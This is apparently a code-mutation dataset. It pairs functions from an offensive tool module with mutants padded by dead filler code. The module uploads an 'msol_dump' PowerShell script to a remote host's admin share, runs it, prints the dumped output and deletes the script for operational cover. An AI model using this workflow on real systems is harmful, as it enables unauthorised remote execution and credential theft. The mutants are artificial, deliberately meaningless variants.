[
    {
        "func_name": "__init__",
        "original": "def __init__(self, context=None, module_options=None):\n    self.use_embedded = None\n    self.MSOL_PS1 = None\n    self.msol_embedded = None\n    self.cmd = None\n    self.msolmdl = None\n    self.msol = None\n    self.tmp_share = None\n    self.share = None\n    self.tmp_dir = None\n    self.context = context\n    self.module_options = module_options",
        "mutated": [
            "def __init__(self, context=None, module_options=None):\n    if False:\n        i = 10\n    self.use_embedded = None\n    self.MSOL_PS1 = None\n    self.msol_embedded = None\n    self.cmd = None\n    self.msolmdl = None\n    self.msol = None\n    self.tmp_share = None\n    self.share = None\n    self.tmp_dir = None\n    self.context = context\n    self.module_options = module_options",
            "def __init__(self, context=None, module_options=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    self.use_embedded = None\n    self.MSOL_PS1 = None\n    self.msol_embedded = None\n    self.cmd = None\n    self.msolmdl = None\n    self.msol = None\n    self.tmp_share = None\n    self.share = None\n    self.tmp_dir = None\n    self.context = context\n    self.module_options = module_options",
            "def __init__(self, context=None, module_options=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    self.use_embedded = None\n    self.MSOL_PS1 = None\n    self.msol_embedded = None\n    self.cmd = None\n    self.msolmdl = None\n    self.msol = None\n    self.tmp_share = None\n    self.share = None\n    self.tmp_dir = None\n    self.context = context\n    self.module_options = module_options",
            "def __init__(self, context=None, module_options=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    self.use_embedded = None\n    self.MSOL_PS1 = None\n    self.msol_embedded = None\n    self.cmd = None\n    self.msolmdl = None\n    self.msol = None\n    self.tmp_share = None\n    self.share = None\n    self.tmp_dir = None\n    self.context = context\n    self.module_options = module_options",
            "def __init__(self, context=None, module_options=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    self.use_embedded = None\n    self.MSOL_PS1 = None\n    self.msol_embedded = None\n    self.cmd = None\n    self.msolmdl = None\n    self.msol = None\n    self.tmp_share = None\n    self.share = None\n    self.tmp_dir = None\n    self.context = context\n    self.module_options = module_options"
        ]
    },
    {
        "func_name": "options",
        "original": "def options(self, context, module_options):\n    \"\"\"\n        MSOL_PS1   // Path to the msol binary on your computer\n        \"\"\"\n    self.tmp_dir = 'C:\\\\Windows\\\\Temp\\\\'\n    self.share = 'C$'\n    self.tmp_share = self.tmp_dir.split(':')[1]\n    self.msol = 'msol.ps1'\n    self.use_embedded = True\n    self.msolmdl = self.cmd = ''\n    with open(get_ps_script('msol_dump/msol_dump.ps1'), 'r') as msolsc:\n        self.msol_embedded = msolsc.read()\n    if 'MSOL_PS1' in module_options:\n        self.MSOL_PS1 = module_options['MSOL_PS1']\n        self.use_embedded = False",
        "mutated": [
            "def options(self, context, module_options):\n    if False:\n        i = 10\n    '\\n        MSOL_PS1   // Path to the msol binary on your computer\\n        '\n    self.tmp_dir = 'C:\\\\Windows\\\\Temp\\\\'\n    self.share = 'C$'\n    self.tmp_share = self.tmp_dir.split(':')[1]\n    self.msol = 'msol.ps1'\n    self.use_embedded = True\n    self.msolmdl = self.cmd = ''\n    with open(get_ps_script('msol_dump/msol_dump.ps1'), 'r') as msolsc:\n        self.msol_embedded = msolsc.read()\n    if 'MSOL_PS1' in module_options:\n        self.MSOL_PS1 = module_options['MSOL_PS1']\n        self.use_embedded = False",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    '\\n        MSOL_PS1   // Path to the msol binary on your computer\\n        '\n    self.tmp_dir = 'C:\\\\Windows\\\\Temp\\\\'\n    self.share = 'C$'\n    self.tmp_share = self.tmp_dir.split(':')[1]\n    self.msol = 'msol.ps1'\n    self.use_embedded = True\n    self.msolmdl = self.cmd = ''\n    with open(get_ps_script('msol_dump/msol_dump.ps1'), 'r') as msolsc:\n        self.msol_embedded = msolsc.read()\n    if 'MSOL_PS1' in module_options:\n        self.MSOL_PS1 = module_options['MSOL_PS1']\n        self.use_embedded = False",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    '\\n        MSOL_PS1   // Path to the msol binary on your computer\\n        '\n    self.tmp_dir = 'C:\\\\Windows\\\\Temp\\\\'\n    self.share = 'C$'\n    self.tmp_share = self.tmp_dir.split(':')[1]\n    self.msol = 'msol.ps1'\n    self.use_embedded = True\n    self.msolmdl = self.cmd = ''\n    with open(get_ps_script('msol_dump/msol_dump.ps1'), 'r') as msolsc:\n        self.msol_embedded = msolsc.read()\n    if 'MSOL_PS1' in module_options:\n        self.MSOL_PS1 = module_options['MSOL_PS1']\n        self.use_embedded = False",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    '\\n        MSOL_PS1   // Path to the msol binary on your computer\\n        '\n    self.tmp_dir = 'C:\\\\Windows\\\\Temp\\\\'\n    self.share = 'C$'\n    self.tmp_share = self.tmp_dir.split(':')[1]\n    self.msol = 'msol.ps1'\n    self.use_embedded = True\n    self.msolmdl = self.cmd = ''\n    with open(get_ps_script('msol_dump/msol_dump.ps1'), 'r') as msolsc:\n        self.msol_embedded = msolsc.read()\n    if 'MSOL_PS1' in module_options:\n        self.MSOL_PS1 = module_options['MSOL_PS1']\n        self.use_embedded = False",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    '\\n        MSOL_PS1   // Path to the msol binary on your computer\\n        '\n    self.tmp_dir = 'C:\\\\Windows\\\\Temp\\\\'\n    self.share = 'C$'\n    self.tmp_share = self.tmp_dir.split(':')[1]\n    self.msol = 'msol.ps1'\n    self.use_embedded = True\n    self.msolmdl = self.cmd = ''\n    with open(get_ps_script('msol_dump/msol_dump.ps1'), 'r') as msolsc:\n        self.msol_embedded = msolsc.read()\n    if 'MSOL_PS1' in module_options:\n        self.MSOL_PS1 = module_options['MSOL_PS1']\n        self.use_embedded = False"
        ]
    },
    {
        "func_name": "exec_script",
        "original": "def exec_script(self, _, connection):\n    command = f'C:\\\\windows\\\\system32\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe {self.tmp_dir}msol.ps1'\n    return connection.execute(command, True)",
        "mutated": [
            "def exec_script(self, _, connection):\n    if False:\n        i = 10\n    command = f'C:\\\\windows\\\\system32\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe {self.tmp_dir}msol.ps1'\n    return connection.execute(command, True)",
            "def exec_script(self, _, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    command = f'C:\\\\windows\\\\system32\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe {self.tmp_dir}msol.ps1'\n    return connection.execute(command, True)",
            "def exec_script(self, _, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    command = f'C:\\\\windows\\\\system32\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe {self.tmp_dir}msol.ps1'\n    return connection.execute(command, True)",
            "def exec_script(self, _, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    command = f'C:\\\\windows\\\\system32\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe {self.tmp_dir}msol.ps1'\n    return connection.execute(command, True)",
            "def exec_script(self, _, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    command = f'C:\\\\windows\\\\system32\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe {self.tmp_dir}msol.ps1'\n    return connection.execute(command, True)"
        ]
    },
    {
        "func_name": "on_admin_login",
        "original": "def on_admin_login(self, context, connection):\n    if self.use_embedded:\n        file_to_upload = '/tmp/msol.ps1'\n        with open(file_to_upload, 'w') as msol:\n            msol.write(self.msol_embedded)\n    elif path.isfile(self.MSOL_PS1):\n        file_to_upload = self.MSOL_PS1\n    else:\n        context.log.fail(f'Cannot open {self.MSOL_PS1}')\n        exit(1)\n    context.log.display(f'Uploading {self.msol}')\n    with open(file_to_upload, 'rb') as msol:\n        try:\n            connection.conn.putFile(self.share, f'{self.tmp_share}{self.msol}', msol.read)\n            context.log.success(f'Msol script successfully uploaded')\n        except Exception as e:\n            context.log.fail(f'Error writing file to share {self.tmp_share}: {e}')\n            return\n    try:\n        if self.cmd == '':\n            context.log.display(f'Executing the script')\n            p = self.exec_script(context, connection)\n            for line in p.splitlines():\n                (p1, p2) = line.split(' ', 1)\n                context.log.highlight(f'{p1} {p2}')\n        else:\n            context.log.fail(f'Script Execution Impossible')\n    except Exception as e:\n        context.log.fail(f'Error running command: {e}')\n    finally:\n        try:\n            connection.conn.deleteFile(self.share, f'{self.tmp_share}{self.msol}')\n            context.log.success(f'Msol script successfully deleted')\n        except Exception as e:\n            context.log.fail(f'[OPSEC] Error deleting msol script on {self.share}: {e}')",
        "mutated": [
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n    if self.use_embedded:\n        file_to_upload = '/tmp/msol.ps1'\n        with open(file_to_upload, 'w') as msol:\n            msol.write(self.msol_embedded)\n    elif path.isfile(self.MSOL_PS1):\n        file_to_upload = self.MSOL_PS1\n    else:\n        context.log.fail(f'Cannot open {self.MSOL_PS1}')\n        exit(1)\n    context.log.display(f'Uploading {self.msol}')\n    with open(file_to_upload, 'rb') as msol:\n        try:\n            connection.conn.putFile(self.share, f'{self.tmp_share}{self.msol}', msol.read)\n            context.log.success(f'Msol script successfully uploaded')\n        except Exception as e:\n            context.log.fail(f'Error writing file to share {self.tmp_share}: {e}')\n            return\n    try:\n        if self.cmd == '':\n            context.log.display(f'Executing the script')\n            p = self.exec_script(context, connection)\n            for line in p.splitlines():\n                (p1, p2) = line.split(' ', 1)\n                context.log.highlight(f'{p1} {p2}')\n        else:\n            context.log.fail(f'Script Execution Impossible')\n    except Exception as e:\n        context.log.fail(f'Error running command: {e}')\n    finally:\n        try:\n            connection.conn.deleteFile(self.share, f'{self.tmp_share}{self.msol}')\n            context.log.success(f'Msol script successfully deleted')\n        except Exception as e:\n            context.log.fail(f'[OPSEC] Error deleting msol script on {self.share}: {e}')",
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if self.use_embedded:\n        file_to_upload = '/tmp/msol.ps1'\n        with open(file_to_upload, 'w') as msol:\n            msol.write(self.msol_embedded)\n    elif path.isfile(self.MSOL_PS1):\n        file_to_upload = self.MSOL_PS1\n    else:\n        context.log.fail(f'Cannot open {self.MSOL_PS1}')\n        exit(1)\n    context.log.display(f'Uploading {self.msol}')\n    with open(file_to_upload, 'rb') as msol:\n        try:\n            connection.conn.putFile(self.share, f'{self.tmp_share}{self.msol}', msol.read)\n            context.log.success(f'Msol script successfully uploaded')\n        except Exception as e:\n            context.log.fail(f'Error writing file to share {self.tmp_share}: {e}')\n            return\n    try:\n        if self.cmd == '':\n            context.log.display(f'Executing the script')\n            p = self.exec_script(context, connection)\n            for line in p.splitlines():\n                (p1, p2) = line.split(' ', 1)\n                context.log.highlight(f'{p1} {p2}')\n        else:\n            context.log.fail(f'Script Execution Impossible')\n    except Exception as e:\n        context.log.fail(f'Error running command: {e}')\n    finally:\n        try:\n            connection.conn.deleteFile(self.share, f'{self.tmp_share}{self.msol}')\n            context.log.success(f'Msol script successfully deleted')\n        except Exception as e:\n            context.log.fail(f'[OPSEC] Error deleting msol script on {self.share}: {e}')",
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if self.use_embedded:\n        file_to_upload = '/tmp/msol.ps1'\n        with open(file_to_upload, 'w') as msol:\n            msol.write(self.msol_embedded)\n    elif path.isfile(self.MSOL_PS1):\n        file_to_upload = self.MSOL_PS1\n    else:\n        context.log.fail(f'Cannot open {self.MSOL_PS1}')\n        exit(1)\n    context.log.display(f'Uploading {self.msol}')\n    with open(file_to_upload, 'rb') as msol:\n        try:\n            connection.conn.putFile(self.share, f'{self.tmp_share}{self.msol}', msol.read)\n            context.log.success(f'Msol script successfully uploaded')\n        except Exception as e:\n            context.log.fail(f'Error writing file to share {self.tmp_share}: {e}')\n            return\n    try:\n        if self.cmd == '':\n            context.log.display(f'Executing the script')\n            p = self.exec_script(context, connection)\n            for line in p.splitlines():\n                (p1, p2) = line.split(' ', 1)\n                context.log.highlight(f'{p1} {p2}')\n        else:\n            context.log.fail(f'Script Execution Impossible')\n    except Exception as e:\n        context.log.fail(f'Error running command: {e}')\n    finally:\n        try:\n            connection.conn.deleteFile(self.share, f'{self.tmp_share}{self.msol}')\n            context.log.success(f'Msol script successfully deleted')\n        except Exception as e:\n            context.log.fail(f'[OPSEC] Error deleting msol script on {self.share}: {e}')",
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if self.use_embedded:\n        file_to_upload = '/tmp/msol.ps1'\n        with open(file_to_upload, 'w') as msol:\n            msol.write(self.msol_embedded)\n    elif path.isfile(self.MSOL_PS1):\n        file_to_upload = self.MSOL_PS1\n    else:\n        context.log.fail(f'Cannot open {self.MSOL_PS1}')\n        exit(1)\n    context.log.display(f'Uploading {self.msol}')\n    with open(file_to_upload, 'rb') as msol:\n        try:\n            connection.conn.putFile(self.share, f'{self.tmp_share}{self.msol}', msol.read)\n            context.log.success(f'Msol script successfully uploaded')\n        except Exception as e:\n            context.log.fail(f'Error writing file to share {self.tmp_share}: {e}')\n            return\n    try:\n        if self.cmd == '':\n            context.log.display(f'Executing the script')\n            p = self.exec_script(context, connection)\n            for line in p.splitlines():\n                (p1, p2) = line.split(' ', 1)\n                context.log.highlight(f'{p1} {p2}')\n        else:\n            context.log.fail(f'Script Execution Impossible')\n    except Exception as e:\n        context.log.fail(f'Error running command: {e}')\n    finally:\n        try:\n            connection.conn.deleteFile(self.share, f'{self.tmp_share}{self.msol}')\n            context.log.success(f'Msol script successfully deleted')\n        except Exception as e:\n            context.log.fail(f'[OPSEC] Error deleting msol script on {self.share}: {e}')",
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if self.use_embedded:\n        file_to_upload = '/tmp/msol.ps1'\n        with open(file_to_upload, 'w') as msol:\n            msol.write(self.msol_embedded)\n    elif path.isfile(self.MSOL_PS1):\n        file_to_upload = self.MSOL_PS1\n    else:\n        context.log.fail(f'Cannot open {self.MSOL_PS1}')\n        exit(1)\n    context.log.display(f'Uploading {self.msol}')\n    with open(file_to_upload, 'rb') as msol:\n        try:\n            connection.conn.putFile(self.share, f'{self.tmp_share}{self.msol}', msol.read)\n            context.log.success(f'Msol script successfully uploaded')\n        except Exception as e:\n            context.log.fail(f'Error writing file to share {self.tmp_share}: {e}')\n            return\n    try:\n        if self.cmd == '':\n            context.log.display(f'Executing the script')\n            p = self.exec_script(context, connection)\n            for line in p.splitlines():\n                (p1, p2) = line.split(' ', 1)\n                context.log.highlight(f'{p1} {p2}')\n        else:\n            context.log.fail(f'Script Execution Impossible')\n    except Exception as e:\n        context.log.fail(f'Error running command: {e}')\n    finally:\n        try:\n            connection.conn.deleteFile(self.share, f'{self.tmp_share}{self.msol}')\n            context.log.success(f'Msol script successfully deleted')\n        except Exception as e:\n            context.log.fail(f'[OPSEC] Error deleting msol script on {self.share}: {e}')"
        ]
    }
]